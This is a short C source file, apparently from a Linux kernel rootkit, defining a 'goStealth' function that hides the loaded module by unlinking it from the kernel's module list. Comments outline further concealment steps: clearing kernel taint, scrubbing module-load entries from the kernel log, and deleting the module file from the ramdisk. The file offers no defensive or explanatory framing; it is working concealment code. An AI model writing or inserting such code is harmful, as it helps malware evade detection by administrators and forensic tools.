#include "stealth.h"

#ifdef STEALTH_MODE
void goStealth(void)
{
    list_del(&THIS_MODULE->list); //Poof! ]:->
    //remove kernel taint
    //remove module loading from klog
    //delete module file from ramdisk
}
#endif //STEALTH_MODE